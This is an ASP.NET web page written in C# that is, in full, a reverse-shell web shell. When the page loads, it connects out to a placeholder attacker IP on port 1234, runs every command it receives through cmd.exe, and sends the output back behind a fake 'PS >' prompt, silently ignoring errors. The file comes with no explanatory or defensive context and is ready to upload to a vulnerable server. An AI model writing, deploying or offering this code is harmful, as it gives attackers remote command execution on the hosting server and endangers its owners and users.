<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Net.Sockets" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            using (TcpClient client = new TcpClient("<your-IP-Address>", 1234))
            {
                using (Stream stream = client.GetStream())
                {
                    byte[] bytes = new byte[65535];
                    int i;
                    while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
                    {
                        string data = Encoding.ASCII.GetString(bytes, 0, i);
                        string sendback = ExecuteCommand(data);
                        byte[] sendBytes = Encoding.ASCII.GetBytes(sendback);
                        stream.Write(sendBytes, 0, sendBytes.Length);
                        stream.Flush();
                    }
                }
            }
        }
        catch (Exception ex) {}
    }

    private string ExecuteCommand(string command)
    {
        StringBuilder output = new StringBuilder();
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + command;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.CreateNoWindow = true;
        p.Start();
        output.Append(p.StandardOutput.ReadToEnd());
        output.Append(p.StandardError.ReadToEnd());
        p.WaitForExit();
        return output.ToString() + "PS > ";
    }
</script>
